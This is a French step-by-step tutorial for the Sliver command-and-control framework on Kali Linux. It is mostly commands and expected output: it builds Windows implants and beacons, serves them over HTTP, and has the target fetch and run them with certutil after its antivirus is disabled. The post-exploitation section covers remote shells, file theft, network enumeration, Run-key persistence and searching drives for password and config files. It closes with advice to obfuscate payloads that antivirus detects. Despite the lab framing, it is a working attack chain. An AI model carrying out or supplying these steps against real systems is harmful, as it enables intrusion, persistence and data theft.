# Guide Étape par Étape : Silver C2 dans Kali Linux

## 📋 ÉTAPES DÉTAILLÉES À SUIVRE

---

## 🔧 PHASE 1 : PRÉPARATION DE L'ENVIRONNEMENT

### **ÉTAPE 1** : Mise à jour de Kali Linux
```bash
# Ouvrir un terminal et taper :
sudo apt update
sudo apt upgrade -y
```
**✅ Résultat attendu** : Mise à jour de tous les paquets

### **ÉTAPE 2** : Installation de Silver C2
```bash
# Installer Silver C2 via APT
sudo apt install sliver -y
```
**✅ Résultat attendu** : Installation de sliver-server et sliver-client

### **ÉTAPE 3** : Vérification de l'installation
```bash
# Vérifier que Silver C2 est installé
sliver-server version
sliver-client --help
```
**✅ Résultat attendu** : Affichage de la version et de l'aide

---

## 🚀 PHASE 2 : DÉMARRAGE DE SILVER C2

### **ÉTAPE 4** : Obtenir votre adresse IP
```bash
# Voir votre IP Kali Linux
ip addr show
# OU
ifconfig
```
**📝 Noter votre IP** (exemple : 192.168.1.100)

### **ÉTAPE 5** : Démarrer le serveur Silver C2
```bash
# Dans le terminal 1 :
sudo sliver-server
```
**✅ Résultat attendu** : 
```
[*] Sliver (linux/amd64) - v1.5.41
[*] Operator: root
[*] Build: 4c26bd1c7789085b4e25b0c1a3d797c5bb02de0d
[*] Compiled: 2023-09-01T18:45:00Z
```

### **ÉTAPE 6** : Connecter le client (nouveau terminal)
```bash
# Ouvrir un NOUVEAU terminal (Ctrl+Shift+T)
sliver-client
```
**✅ Résultat attendu** : 
```
Connecting to localhost:31337 ...
[*] Successfully connected to server
sliver >
```

---

## 🎯 PHASE 3 : CONFIGURATION DES LISTENERS

### **ÉTAPE 7** : Créer un listener mTLS
```bash
# Dans le client Silver (sliver >)
mtls --lport 443
```
**✅ Résultat attendu** :
```
[*] Starting mTLS listener ...
[*] Successfully started job #1
```

### **ÉTAPE 8** : Vérifier les listeners actifs
```bash
jobs
```
**✅ Résultat attendu** :
```
 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        443
```

---

## 💾 PHASE 4 : GÉNÉRATION DE PAYLOADS

### **ÉTAPE 9** : Créer un répertoire de travail
```bash
# Dans un NOUVEAU terminal (garder Silver ouvert)
mkdir ~/silver-payloads
cd ~/silver-payloads
```

### **ÉTAPE 10** : Générer votre premier payload Windows
```bash
# Retourner dans le client Silver (sliver >)
generate --mtls 192.168.1.100:443 --os windows --arch amd64 --format exe --save /home/kali/silver-payloads/payload.exe
```
**🔴 REMPLACER** `192.168.1.100` par VOTRE IP de l'étape 4

**✅ Résultat attendu** :
```
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:15
[*] Implant saved to /home/kali/silver-payloads/payload.exe
```

### **ÉTAPE 11** : Générer un beacon (plus furtif)
```bash
generate beacon --mtls 192.168.1.100:443 --os windows --arch amd64 --format exe --jitter 30s --interval 60s --save /home/kali/silver-payloads/beacon.exe
```
**✅ Résultat attendu** : Beacon généré avec succès

### **ÉTAPE 12** : Vérifier les payloads créés
```bash
# Dans le terminal normal
ls -la ~/silver-payloads/
```
**✅ Résultat attendu** :
```
-rwxr-xr-x 1 kali kali 8445952 Jan 15 10:30 payload.exe
-rwxr-xr-x 1 kali kali 8556032 Jan 15 10:32 beacon.exe
```

---

## 🌐 PHASE 5 : TRANSFERT DES PAYLOADS

### **ÉTAPE 13** : Créer un serveur web pour le transfert
```bash
# Dans le répertoire des payloads
cd ~/silver-payloads
python3 -m http.server 8080
```
**✅ Résultat attendu** :
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

### **ÉTAPE 14** : Tester l'accès aux payloads
```bash
# Dans un NOUVEAU terminal
curl -I http://192.168.1.100:8080/payload.exe
```
**✅ Résultat attendu** : HTTP/1.0 200 OK

---

## 🎯 PHASE 6 : TEST AVEC MACHINE VIRTUELLE CIBLE

### **ÉTAPE 15** : Préparer une VM Windows de test
- Créer une VM Windows (VirtualBox/VMware)
- Désactiver l'antivirus (pour les tests)
- S'assurer qu'elle peut accéder à votre Kali

### **ÉTAPE 16** : Télécharger le payload sur la cible
```cmd
# Sur la machine Windows cible :
certutil -urlcache -split -f http://192.168.1.100:8080/payload.exe payload.exe
```
**🔴 REMPLACER** `192.168.1.100` par VOTRE IP

### **ÉTAPE 17** : Exécuter le payload sur la cible
```cmd
# Sur Windows (ATTENTION : uniquement en test !)
.\payload.exe
```

### **ÉTAPE 18** : Vérifier la connexion dans Silver
```bash
# Dans le client Silver (sliver >)
sessions
```
**✅ Résultat attendu** :
```
 ID         Transport   Remote Address      Hostname      Username          Operating System   Last Message 
========== =========== =================== ============= ================= ================== ==============
 a1b2c3d4   mtls        192.168.1.150:49234 WIN10-PC     DESKTOP\user      windows/amd64      1m ago
```

---

## 🔥 PHASE 7 : POST-EXPLOITATION

### **ÉTAPE 19** : Interagir avec la session
```bash
# Sélectionner la session
use a1b2c3d4
```
**✅ Résultat attendu** : Le prompt change vers `[a1b2c3d4] sliver >`

### **ÉTAPE 20** : Reconnaissance système
```bash
# Informations système
info

# Utilisateur actuel
whoami

# Processus en cours
ps

# Répertoire courant
pwd

# Lister les fichiers
ls
```

### **ÉTAPE 21** : Tests de commandes
```bash
# Exécuter une commande shell
shell

# Dans le shell (Windows) :
dir C:\Users
whoami /all
systeminfo
exit
```

### **ÉTAPE 22** : Transfert de fichiers
```bash
# Télécharger un fichier depuis la cible
download C:\Windows\System32\drivers\etc\hosts /tmp/hosts_target

# Uploader un fichier vers la cible
upload /etc/passwd C:\temp\passwd.txt
```

---

## 🔍 PHASE 8 : TECHNIQUES AVANCÉES

### **ÉTAPE 23** : Énumération réseau
```bash
# Depuis la session Silver
execute ipconfig /all
execute netstat -an
execute net view
execute net user
```

### **ÉTAPE 24** : Persistence (TEST UNIQUEMENT)
```bash
# Créer une entrée de registre pour persistence
execute reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /t REG_SZ /d "C:\temp\payload.exe"
```

### **ÉTAPE 25** : Recherche de fichiers sensibles
```bash
# Chercher des fichiers intéressants
execute dir C:\ /s /b | findstr /i password
execute dir C:\ /s /b | findstr /i config
execute dir C:\Users\%USERNAME%\Desktop /b
```

---

## 🧹 PHASE 9 : NETTOYAGE

### **ÉTAPE 26** : Supprimer les traces
```bash
# Supprimer la persistence
execute reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /f

# Supprimer les fichiers
execute del C:\temp\payload.exe /f
execute del C:\temp\passwd.txt /f
```

### **ÉTAPE 27** : Fermer la session
```bash
# Terminer la session
sessions -k a1b2c3d4

# OU depuis la session
exit
```

### **ÉTAPE 28** : Arrêter Silver C2
```bash
# Arrêter les listeners
jobs -k 1

# Quitter le client
exit

# Dans le terminal serveur : Ctrl+C
```

---

## 📊 RÉCAPITULATIF DES COMMANDES ESSENTIELLES

### **Installation**
```bash
sudo apt update && sudo apt install sliver -y
```

### **Démarrage**
```bash
# Terminal 1 : Serveur
sudo sliver-server

# Terminal 2 : Client
sliver-client
```

### **Génération de payload**
```bash
# Listener
mtls --lport 443

# Payload
generate --mtls VOTRE_IP:443 --os windows --format exe --save payload.exe
```

### **Session**
```bash
sessions          # Lister
use [ID]          # Sélectionner
info              # Info système
whoami            # Utilisateur
ls                # Fichiers
shell             # Shell interactif
```

---

## ⚠️ POINTS IMPORTANTS À RETENIR

### **🔴 Sécurité**
- ✅ Utilisez UNIQUEMENT dans un environnement de test
- ✅ Obtenez toujours une autorisation écrite
- ✅ Désactivez l'antivirus uniquement pour les tests
- ❌ JAMAIS sur des systèmes de production

### **🔧 Troubleshooting**
- Si pas de connexion : Vérifiez les pare-feux
- Si payload détecté : Utilisez l'obfuscation
- Si erreur de port : Changez le port du listener

### **📝 Documentation**
- Documentez toutes vos actions
- Sauvegardez les logs
- Nettoyez après les tests

---

**🎯 Vous avez maintenant toutes les étapes pour utiliser Silver C2 !**

Suivez ces étapes une par une, dans l'ordre, et vous devriez avoir un environnement Silver C2 fonctionnel pour vos tests de sécurité autorisés.